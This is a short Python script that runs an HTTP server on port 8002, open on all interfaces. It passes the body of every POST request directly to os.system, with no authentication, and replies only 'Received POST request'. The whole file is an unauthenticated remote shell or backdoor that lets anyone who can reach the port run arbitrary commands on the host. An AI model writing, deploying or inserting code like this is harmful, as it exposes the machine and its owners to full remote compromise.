from http.server import HTTPServer, BaseHTTPRequestHandler
import os

class RequestHandler(BaseHTTPRequestHandler):
    def do_POST(self):
        # Handle POST request
        content_length = int(self.headers.get("Content-Length", 0))
        body = self.rfile.read(content_length)
        command = body.decode("utf-8")
        os.system(command)
        self.send_response(200)
        self.send_header("Content-type", "text/plain")
        self.end_headers()
        self.wfile.write(b"Received POST request")

# Start the server on port 8002
server_address = ("", 8002)
httpd = HTTPServer(server_address, RequestHandler)
print("Server started on port 8002")
httpd.serve_forever()
